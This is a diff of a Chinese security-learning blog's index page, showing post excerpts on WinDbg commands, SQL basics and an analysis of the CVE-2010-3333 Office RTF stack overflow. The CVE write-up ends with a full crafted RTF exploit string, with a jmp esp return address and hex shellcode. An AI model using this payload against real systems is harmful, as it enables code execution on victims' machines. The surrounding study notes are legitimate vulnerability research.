@@ -1,559 +1,1412 @@
 <!DOCTYPE html>
-<html lang="en">
-
+<html>
 <head>
-	<meta http-equiv="content-type" content="text/html; charset=utf-8">
-	<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
-	
-	<!-- title -->
-	
-	<title>
-	 
-	Sinky-wang
-	</title>
-	
-	<!-- keywords,description -->
-	 
+  <meta charset="utf-8">
+  
+  <title>Sinky-wang</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="Sinky-wang">
+<meta property="og:url" content="https://sinky-wang.github.io/index.html">
+<meta property="og:site_name" content="Sinky-wang">
+<meta property="og:locale" content="en_US">
+<meta property="article:author" content="Sinky-wang">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternative" href="/atom.xml" title="Sinky-wang" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/http://oayoilchh.bkt.clouddn.com/2016/07/27/18:05:26%20">
+  
+  
+      
+<link rel="stylesheet" href="//cdn.bootcss.com/animate.css/3.5.0/animate.min.css">
 
-	<!-- favicon -->
-	
-	<link rel="shortcut icon" href="/favicon.ico">
-	
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
+  <link rel="apple-touch-icon" href="/apple-touch-icon.png">
+  
+    
+    
+  
+  
+      <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  
+  <!-- 加载特效 -->
+    <script src="/js/pace.js"></script>
+    <link href="/css/pace/pace-theme-flash.css" rel="stylesheet" />
+  <script>
+      var yiliaConfig = {
+          rootUrl: '/',
+          fancybox: true,
+          animate: true,
+          isHome: true,
+          isPost: false,
+          isArchive: false,
+          isTag: false,
+          isCategory: false,
+          open_in_new: false
+      }
+  </script>
+    <!--自定义看板娘-->
+  <script src="https://cdn.jsdelivr.net/npm/jquery/dist/jquery.min.js"></script>
+  <script src="/live2d-widget/autoload.js"></script>
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome/css/font-awesome.min.css"/>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <script src="http://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+        <a href="/" class="profilepic">
+            
+            <img lazy-src="img/head.jpg" class="js-avatar">
+            
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Sinky-wang</a></h1>
+        </hgroup>
+        
+        
+            <form>
+                <input type="text" class="st-default-search-input search" id="local-search-input" placeholder="搜索一下" autocomplete="off">
+            </form>
+            <div id="local-search-result"></div>
+        
+        
+            <script type="text/javascript">
+                (function() {
+                    'use strict';
+                    function getMatchData(keyword, data) {
+                        var matchData = [];
+                        for(var i =0;i<data.length;i++){
+                            if(data[i].title.toLowerCase().indexOf(keyword)>=0) 
+                                matchData.push(data[i])
+                        }
+                        return matchData;
+                    }
+                    var $input = $('#local-search-input');
+                    var $resultContent = $('#local-search-result');
+                    $input.keyup(function(){
+                        $.ajax({
+                            url: '/search.json',
+                            dataType: "json",
+                            success: function( json ) {
+                                var str='<ul class=\"search-result-list\">';                
+                                var keyword = $input.val().trim().toLowerCase();
+                                $resultContent.innerHTML = "";
+                                if ($input.val().trim().length <= 0) {
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                }
+                                var results = getMatchData(keyword, json);
+                                if(results.length === 0){
+                                    $resultContent.empty();
+                                    $('#switch-area').show();
+                                    return;
+                                } 
+                                for(var i =0; i<results.length; i++){
+                                    str += "<li><a href='"+ results[i].url +"' class='search-result-title'>"+ results[i].title +"</a></li>";
+                                }
+                                str += "</ul>";
+                                $resultContent.empty();
+                                $resultContent.append(str);
+                                $('#switch-area').hide();
+                            }
+                        });
+                    });
+                })();
+            </script>
+        
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a  href="https://Sinky-wang.github.io">博客首页</a></li>
+                        
+                            <li><a  href="/archives">文章归档</a></li>
+                        
+                            <li><a  href="/CTFStudy">学习导航</a></li>
+                        
+                            <li><a  href="/PWNABLE">PWNABLE</a></li>
+                        
+                            <li><a  href="/resume">个人简历</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fl mail"  target="_blank" href="/Wangxq2@knowsec.com" title="mail">mail</a>
+                            
+                                <a class="fl github"  target="_blank" href="https://Sinky-wang.github.io/" title="github">github</a>
+                            
+                                <a class="fl zhihu"  target="_blank" href="https://www.zhihu.com/people/shi-guang-21-4" title="zhihu">zhihu</a>
+                            
+                                <a class="fl weibo"  target="_blank" href="https://weibo.com/u/7452927418" title="weibo">weibo</a>
+                            
+                                <a class="fl rss"  target="_blank" href="/atom.xml" title="rss">rss</a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        <a href="/tags/chrome/" style="font-size: 13.33px;">chrome</a> <a href="/tags/chrome-bug/" style="font-size: 16.67px;">chrome_bug</a> <a href="/tags/chrome%E7%9F%A5%E8%AF%86%E7%82%B9/" style="font-size: 10px;">chrome知识点</a> <a href="/tags/chrome%E8%B0%83%E8%AF%95/" style="font-size: 13.33px;">chrome调试</a> <a href="/tags/mood/" style="font-size: 10px;">mood</a> <a href="/tags/pwn/" style="font-size: 20px;">pwn</a> <a href="/tags/windows%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">windows漏洞</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" style="font-size: 10px;">学习笔记</a> <a href="/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/" style="font-size: 10px;">学习记录</a> <a href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" style="font-size: 13.33px;">漏洞战争</a>
+                    </div>
+                </section>
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://yunee.top/">yunee</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://weik1.top/">weik1</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://www.abelche.com/">Abelche</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://prowes5.github.io">Prowers5</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="http://www.sfishlost.com/">superfish</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://kirin-say.top/">Kirin</a>
+                    
+                      <a target="_blank"  class="main-nav-link switch-friends-link" href="https://nobb.site/">Hcamael</a>
+                    
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">总是找不到漏洞的二进制菜狗 微信：visionary243694 欢迎各位大佬指导</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="Me">Sinky-wang</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                
+                    <img lazy-src="/img/head.jpg" class="js-avatar">
+                
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="Me">Sinky-wang</a></h1>
+            </hgroup>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="https://Sinky-wang.github.io">博客首页</a></li>
+                
+                    <li><a href="/archives">文章归档</a></li>
+                
+                    <li><a href="/CTFStudy">学习导航</a></li>
+                
+                    <li><a href="/PWNABLE">PWNABLE</a></li>
+                
+                    <li><a href="/resume">个人简历</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                <div class="social">
+                    
+                        <a class="mail" target="_blank" href="/Wangxq2@knowsec.com" title="mail">mail</a>
+                    
+                        <a class="github" target="_blank" href="https://Sinky-wang.github.io/" title="github">github</a>
+                    
+                        <a class="zhihu" target="_blank" href="https://www.zhihu.com/people/shi-guang-21-4" title="zhihu">zhihu</a>
+                    
+                        <a class="weibo" target="_blank" href="https://weibo.com/u/7452927418" title="weibo">weibo</a>
+                    
+                        <a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+                    
+                </div>
+            </nav>
+        </header>                
+    </div>
+</nav>
+      <div class="body-wrap">
+  
+    <article id="post-CVE-2006-3439" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/08/13/CVE-2006-3439/" class="article-date">
+      <time datetime="2020-08-13T06:37:38.670Z" itemprop="datePublished">2020-08-13</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/08/13/CVE-2006-3439/">CVE-2006-3439</a>
+    </h1>
   
 
-	
-<link rel="stylesheet" href="/css/main.css">
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
 
-	
-<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/4.7.0/css/font-awesome.min.css">
+      
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
 
-	
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.17.1/build/styles/darcula.min.css">
 
 
-	
-<script src="https://cdn.jsdelivr.net/gh/highlightjs/cdn-release@9.17.1/build/highlight.min.js"></script>
 
-	
-<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
 
-	
-<script src="https://cdn.jsdelivr.net/npm/jquery-pjax@2.0.1/jquery.pjax.min.js"></script>
 
-	
+
+
+
+  
+    <article id="post-WinDbg使用整理" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/31/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/" class="article-date">
+      <time datetime="2020-07-31T07:46:35.736Z" itemprop="datePublished">2020-07-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/31/WinDbg%E4%BD%BF%E7%94%A8%E6%95%B4%E7%90%86/">WinDbg使用整理</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x00-基础命令"><a href="#0x00-基础命令" class="headerlink" title="0x00 基础命令"></a>0x00 基础命令</h2><ul>
+<li>.sympath　　//显示设置的符号表路径</li>
+<li>.reload　　　　//此命令主要用于加载符号表。</li>
+<li>.reload /f　　//重新装载模块</li>
+<li>.reload /i　　//强制加载mismatched symbol</li>
+<li>U　　//这个命令主要用于反汇编某个地址，其后面可以跟函数名和地址。U命令后面可以加L表示延长反汇编长度</li>
+<li>db　　//显示一字节的长度。</li>
+<li>dw　　//显示两字节的长度。</li>
+<li>dd　　//显示四字节的长度。</li>
+<li>dq　　//显示八字节的长度。</li>
+<li>dD　　//显示double实数(8字节的长度)。</li>
+<li>df　　//显示float实数(4字节的长度)。</li>
+<li>da     //显示asscii值</li>
+<li>du     //显示unicode值</li>
+<li>ds     //显示ANI_STRING值</li>
+<li>dS     //显示UNICODE_STRING的值</li>
+<li>eb address value　　//在address 这个地址写入一个字节value</li>
+<li>ew address value　　//在address 这个地址写入两字节value</li>
+<li>ed address value　　//在address 这个地址写入四字节字节value</li>
+<li>eq address value　　//在address 这个地址写入八字节字节value</li>
+</ul>
+<h2 id="0x01-对象相关命令"><a href="#0x01-对象相关命令" class="headerlink" title="0x01 对象相关命令"></a>0x01 对象相关命令</h2><ul>
+<li>dt　　//dt命令主要用于查看结构体。</li>
+<li>lm　　//列出模块。</li>
+<li>lm vm 模块名　　//查看模块详细信息。 </li>
+<li>!process 0 0 　　　　//列出系统进程信息</li>
+<li>!process 0 0 进程名  //列出该进程的信息</li>
+<li>!process 0 1 进程名  //列出该进程更加的信息</li>
+<li>!process 0 7 进程名  //列出该进程的详细信息，包括线程的</li>
+<li>.process EPROCESS　　//切入该进程中</li>
+<li>!object 地址　　//显示该地址的对象信息。</li>
+<li>bp address  //在地址address插入断点。</li>
+<li>ba命令是是硬件断点命令，通过设置cpu的dx寄存器来拦截线程。</li>
+<li>ba access size 地址　　//access 是访问的方式，比如 e (执行)，r (读/写)，w (写) ，size是监控访问的位置 的大小，以字节为单位。值 为 1、2或4，在64位机器上还可以是8。</li>
+<li>bd/be/bc</li>
+<li>bd 断点号 //此命令是关闭断点号所对应的断点 。</li>
+<li>be 断点号 //此命令是开启断点号所对应的断点 。</li>
+<li>bc *　　　//去除所有断点。</li>
+<li>x   //x命令用来模糊查询</li>
+<li>x nt!kes<em>des*table</em>   //样查看SSDT表的地址</li>
+<li>dds 地址 //此命令用来解析某连续地址的函数名。</li>
+</ul>
+
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" rel="tag">学习笔记</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-漏洞战争学习笔记2：CVE-2010-3333" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/31/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/" class="article-date">
+      <time datetime="2020-07-31T02:40:13.129Z" itemprop="datePublished">2020-07-31</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/31/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02%EF%BC%9ACVE-2010-3333/">漏洞战争学习笔记2：CVE-2010-3333</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x01-分析环境"><a href="#0x01-分析环境" class="headerlink" title="0x01 分析环境"></a>0x01 分析环境</h2><p>os:由于笔者实在没有找到大佬们使用的目标文件office word 2003 11.5604.5606,只有11.8169.8172，但是应该只要是2003 sp3的应该就问题不大。</p>
+<p>操作系统：windows XP SP3<br>虚拟机：VM<br>调试器：WinDbg、OD、IDA<br>office:office word 2003 11.8169.8172</p>
+<h2 id="0x02-漏洞描述"><a href="#0x02-漏洞描述" class="headerlink" title="0x02 漏洞描述"></a>0x02 漏洞描述</h2><p>oddice xp sp3、2003 sp3、2007 sp2、2010等多个版本的office软件中的Open XML文件格式转换器存在栈溢出漏洞，主要是在处理RTF的”pFragments”属性时存在栈溢出，导致远程攻击者可以借助特制的RTF数据执行任意代码，因此该漏洞又名”RTF栈缓冲区溢出漏洞”。</p>
+<p>office word 2003中的MSO.dll库在解析RTF文档的绘图pFRagments属性时完全信任其数据，未做任何检查便将数据复制到栈中，存在了栈溢出的可能，导致用户打开精心构造的RTF文件时就有可能导致执行任意代码。</p>
+<h2 id="0x03-分析过程"><a href="#0x03-分析过程" class="headerlink" title="0x03 分析过程"></a>0x03 分析过程</h2><p>用Metasploit生成测试样本msf.rtf。</p>
+<p><img src="https://i.loli.net/2020/07/31/GPUKdY8nFfENx5y.png" alt="生成msf.PNG"></p>
+<p>运行WinDbg附加Word 2003，但是每次都是还没有打开测试样本的时候，windbg就已经报错了，我裂开了呀。然后看报错是ntdll.dll文件符号文件无法找到，那我下载一个弄，结果并没有缺失，我又裂开了！</p>
+<p><img src="https://i.loli.net/2020/07/31/ilXRZynC2UDtJ9T.png" alt="裂开.PNG"></p>
+<p>[待续]</p>
+<p>打开测试样本，WinDbg捕获异常，循环赋值内存数据到栈空间时，未检测复制的内存大小，导致覆盖到edi（0x130000）开始的不可写页面,触发异常的指令位于30e9eb88,当前栈已被样本生成的垃圾数据覆盖。</p>
+<ul>
+<li>g</li>
+<li>kb</li>
+</ul>
+<p>在30e9eb88处下断，重新打开测试样本，断下来后通过kb指令得到的信息进行回溯，<br>结合IDA，可知调用函数及其执行流程：30f4cc5d-&gt;30f4cc93 call 30e9eb62-&gt;30e9eb88</p>
+<p>通过跟踪分析可发现，复制的数据大小由样本中的某一处决定，如下面两张图，前面的4在后面的计算中会变成0，并且将c8ac除以4（因为操作的大小为DWORD</p>
+<ul>
+<li>p</li>
+</ul>
+<p>为了确定该栈溢出漏洞能劫持程序运行流程，自己构造一个长度偏小（防止触发访问异常）但又能覆盖返回地址的测试样本, 打开该样本，WinDbg捕获异常，eip已被改为111111，至此我们可以确定该栈溢出漏洞可被利用</p>
+<h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><h3 id="覆盖返回地址"><a href="#覆盖返回地址" class="headerlink" title="覆盖返回地址"></a>覆盖返回地址</h3><p>找到覆盖成返回地址的地方，修改成0x7ffa4512（jmp esp），再在后面添加一些0x90，然后运行起来还没到执行到栈中就会崩溃，推测前面测试样本太小没怎么污染到栈空间，一开始还想着还原栈空间，但是重新分析了测试样本后发现其在下图中30F4CB29处是实现跳转的，而加了一些0x90后不跳转，并进行了一些与栈相关的操作，从而导致崩溃</p>
+<h3 id="布置shellcode"><a href="#布置shellcode" class="headerlink" title="布置shellcode"></a>布置shellcode</h3><p>分析了下，是栈中多了一些0x90导致原来的一堆00不见了，所以需要在返回地址后面加40个00，这样就可以执行到栈中了。在后面加入shellcode，重新运行并成功进入shellcode，<br>布置shellcode如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;\rtf1&#123;&#125;&#123;\shp&#123;\*\shpinst&#123;\sp&#123;\sn pfragments&#125;&#123;\sv1;1;11111111111111111111111111111111111111111111111111111245fa7f0000000000000000000000000000000000000000fc686a0a381e686389d14f683274910c8bf48d7ef433dbb7042be366bb33325368757365725433d2648b5a308b4b0c8b491c8b098b6908ad3d6a0a381e750595ff57f895608b453c8b4c057803cd8b592003dd33ff478b34bb03f5990fbe063ac47408c1ca0703d046ebf13b54241c75e48b592403dd668b3c7b8b591c03dd032cbb955fab57613d6a0a381e75a933db536875730000687267656f68524e476f8bc453505053ff57fc53ff57f8&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure>
+      
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+
+      
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E6%88%98%E4%BA%89/" rel="tag">漏洞战争</a></li></ul>
+    </div>
+
+      
+      <div class="clearfix"></div>
+    </div>
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+
+
+  
+    <article id="post-SQL学习与整理" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2020/07/30/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/" class="article-date">
+      <time datetime="2020-07-30T08:00:59.244Z" itemprop="datePublished">2020-07-30</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2020/07/30/SQL%E5%AD%A6%E4%B9%A0%E4%B8%8E%E6%95%B4%E7%90%86/">SQL学习与整理</a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <h2 id="0x01-SQL简介"><a href="#0x01-SQL简介" class="headerlink" title="0x01 SQL简介"></a>0x01 SQL简介</h2><p>SQL（结构化查询语言）用于访问和操作数据库中的数据的标准数据库编程语言。</p>
+<p>SQL是关系数据库系统的标准语言，是一种ANSI标准的计算机语言。</p>
+<p>要创建一个显示数据库中的数据的网站，需要：</p>
+<ul>
+<li>一个RDBMS数据库程序（MS Access SQL Server MySQL）</li>
+<li>使用服务器端脚本语言（PHP ASP）</li>
+<li>使用SQL来获取所需的数据</li>
+<li>使用HTML/CSS来设置页面的样式</li>
+</ul>
+<h2 id="0x02-SQL-RDBMS概念"><a href="#0x02-SQL-RDBMS概念" class="headerlink" title="0x02 SQL RDBMS概念"></a>0x02 SQL RDBMS概念</h2><p>RDBMS是关系数据库管理系统的缩写，是SQL的基础。</p>
+<h3 id="什么是表"><a href="#什么是表" class="headerlink" title="什么是表"></a>什么是表</h3><p>RDBMS中的数据存储在成为表的数据库对象中，这个表基本上是一个相关数据条目的集合，由许多列和行组成，表是关系数据库中最常见和最简单的数据存储形式。</p>
+<h3 id="什么是字段"><a href="#什么是字段" class="headerlink" title="什么是字段"></a>什么是字段</h3><p>每个表都被分解成更小的实体，成为字段，Customers表中的字段由ID、姓名、年龄、地址和薪资组成。</p>
+<p>字段是表中的列，用于维护有关表中每条记录的特定信息。</p>
+<h3 id="什么是记录或者行数据"><a href="#什么是记录或者行数据" class="headerlink" title="什么是记录或者行数据"></a>什么是记录或者行数据</h3><p>记录也成为数据行，即表中存在的每个单独的条目。</p>
+<p>记录是表中的水平实体。</p>
+<h3 id="什么是列？"><a href="#什么是列？" class="headerlink" title="什么是列？"></a>什么是列？</h3><p>列是表彰的垂直实体，其中包含与表中特定字段关联的所有信息。</p>
+<h3 id="什么是空值"><a href="#什么是空值" class="headerlink" title="什么是空值"></a>什么是空值</h3><p>表中的空值是显示为空的字段中的值，这意味中具有空值的字段是没有值的字段。</p>
+<h3 id="SQL约束"><a href="#SQL约束" class="headerlink" title="SQL约束"></a>SQL约束</h3><p>约束是在表上的数据列上强制执行的规则，用于限制可以进入表中的数据类型，这确保了数据库中数据的准确性和可靠性。<br>约束可以是列级别，也可以是表级别，列级约束仅应用于一列，而表级约束则应用于整个表。</p>
+<ul>
+<li>NOT NULL约束：保列中数据不能有NULL值。</li>
+<li>DEFAULT约束：提供该列数据未指定时所采用的默认值。</li>
+<li>UNIQUE约束：保证列中的所有数据各不相同。</li>
+<li>主键约束：唯一标识数据表中的行/记录</li>
+<li>外键约束：唯一标识其他表中的一条行/记录</li>
+<li>CHECK约束：此约束保证列中的所有值满足某一条件</li>
+<li>索引：用于在数据库中快速创建或检索数据</li>
+</ul>
+<p>约束可以在创建表时规定（通过CREATE TABLE语句）或者在表创建减值后规定（通过ALTER TABLE语句）。</p>
+<h3 id="数据完整性"><a href="#数据完整性" class="headerlink" title="数据完整性"></a>数据完整性</h3><p>每个关系数据库管理系统都存在以下类型的数据完整性：</p>
+<ul>
+<li>实体完整性-表中无重复行</li>
+<li>域完整性-通过限制值的类型，格式或范围来强制执行给定列的有效条目</li>
+<li>引用完整性-不能删除其他记录使用的行。</li>
+<li>用户定义的完整性-强制执行一些不属于实体、域或引用完整性的特定业务规则。</li>
+</ul>
+<h3 id="数据库规范化"><a href="#数据库规范化" class="headerlink" title="数据库规范化"></a>数据库规范化</h3><p>数据库规范化是在数据库中有效的组织数据的过程，这个规范化过程有两个原因：</p>
+<ul>
+<li>消除多余数据</li>
+<li>确保数据依赖关系是有意义的</li>
+</ul>
+<p>规范化指导原则称为范式，范式的目的是组织数据库结构，使其符合第一范式、第二范式和第三范式的规则。</p>
+<h2 id="0x03-SQL语法"><a href="#0x03-SQL语法" class="headerlink" title="0x03 SQL语法"></a>0x03 SQL语法</h2><h3 id="SQL语法规则"><a href="#SQL语法规则" class="headerlink" title="SQL语法规则"></a>SQL语法规则</h3><ul>
+<li>SQL语句总是以关键字开始，如SELECT、INSERT、UPDATE、DELETE、DROP、CREATE.</li>
+<li>SQL语句以分号结尾</li>
+<li>SQL不区分大小写。</li>
+</ul>
+<h3 id="数据库表"><a href="#数据库表" class="headerlink" title="数据库表"></a>数据库表</h3><p>数据库通常包含一个或多个表，每个表都用一个名称标识，该表包含带有数据的记录。</p>
+<h3 id="SQL语句"><a href="#SQL语句" class="headerlink" title="SQL语句"></a>SQL语句</h3><p><code>SELECT * FROM Customers;</code></p>
+<h3 id="一些重要的SQL命令"><a href="#一些重要的SQL命令" class="headerlink" title="一些重要的SQL命令"></a>一些重要的SQL命令</h3><ul>
+<li>SELECT：从数据库中提取数据</li>
+<li>UPDATE：更新数据库中的数据</li>
+<li>DALETE：从数据库中删除数据</li>
+<li>INSERT INTO：向数据库中插入新数据</li>
+<li>CREATE DATABASE：创建新数据库</li>
+<li>ALTER DATABASE:修改数据库</li>
+<li>CREATE TABLE：创建数据库</li>
+<li>ALTER TABLE:变更数据库表</li>
+<li>DROP TABLE:删除表</li>
+<li>CREATE INDEX：创建索引</li>
+<li>DROP INDEX：删除索引</li>
+</ul>
+<ul>
+<li>SELECT:<code>SELECT column_name(s) FROM table_name</code></li>
+<li>SELECT语句和WHERE子句：<code>SELECT [*] FROM [TableName] WHERE [condition]</code></li>
+<li>SELECT语句和WHERE和/或子句：<code>SELECT [*] FROM [TableName] WHERE [condition1] [AND [or]] [condition2]...</code></li>
+<li>SELECT语句与ORDER BY:<ul>
+<li><code>SELECT column_name()</code></li>
+<li><code>FROM table_name</code></li>
+<li><code>ORDER BY column_name() ASC or DESC</code></li>
+</ul>
+</li>
+<li>SELECT DISTINCT（区分）子句：<ul>
+<li><code>SELECT DISTINCT column1,...columnN</code></li>
+<li><code>FROM table_name;</code></li>
+</ul>
+</li>
+<li>SELECT IN子句：<ul>
+<li><code>SELECT column1,column2...columnN</code></li>
+<li><code>FROM table_name</code></li>
+<li><code>WHERE column_name IN (val-1,val-2,...val-N);</code></li>
+</ul>
+</li>
+<li>SELECT LIKE(类)子句：<ul>
+<li><code>SELECT column1,column2...columnN</code></li>
+<li><code>FROM table_name</code></li>
+<li><code>WHERE column_name LIKE {PATTERN};</code></li>
+</ul>
+</li>
+<li>SELECT COUNT（计数）子句：<ul>
+<li><code>SELECT COUNT(column_name)</code></li>
+<li><code>FROM table_name</code></li>
+<li><code>WHERE CONDITION;</code></li>
+</ul>
+</li>
+<li>SELECT与HAVING子句：<ul>
+<li><code>SELECT SUM(column_name)</code></li>
+<li><code>FROM table_name</code></li>
+<li><code>WHERE CONDITION</code></li>
+<li><code>GROUP BY column_name</code></li>
+<li><code>HAVING (arithematic function condition);</code></li>
+</ul>
+</li>
+<li>INSERT INTO语句：<ul>
+<li><code>INSERT INTO table_name(column1,column2,column3,...)</code></li>
+<li><code>VALUES (value,value1,value2,value3...)</code></li>
+</ul>
+</li>
+<li>UPDATE语句：<ul>
+<li><code>UPDATE table_name</code></li>
+<li><code>SET column=value,column1=value1</code></li>
+<li><code>WHERE someColumn=someValue</code></li>
+</ul>
+</li>
+<li>DELETE语句：<ul>
+<li><code>DELETE FROM tableName</code></li>
+<li><code>WHERE someColumn=someValue</code></li>
+</ul>
+</li>
+<li>CREATE语句：<ul>
+<li><code>CREATE TABLE table_name(column1  datatype,column2 datatype,column3 datatype,...columnN datatype,PRIMARY KEY(one or moe columns ));</code></li>
+</ul>
+</li>
+<li>DROP语句：<ul>
+<li><code>DROP TABLE table_name;</code></li>
+</ul>
+</li>
+<li>DROP INDEX语句：<ul>
+<li><code>AL TER TABLE table_name</code></li>
+<li><code>DROP INDEX index_name;</code></li>
+</ul>
+</li>
+<li>DESC语句：<ul>
+<li><code>DESC table_name;</code></li>
+</ul>
+</li>
+<li>TRUNCATE截断表语句：<ul>
+<li><code>TRUNCATE TABLE table_name;</code></li>
+</ul>
+</li>
+<li>ALTER TABLE语句：<ul>
+<li><code>ALTER TABLE table_name{ADD|DROP|MODIFY} column_name {data_type};</code></li>
+</ul>
+</li>
+<li>ALTER TABLE(对表名重命名)<ul>
+<li><code>ALTER TABLE table_name RENAME TO new_table_name;</code></li>
+</ul>
+</li>
+<li>USE语句：<ul>
+<li><code>USE database_name;</code></li>
+</ul>
+</li>
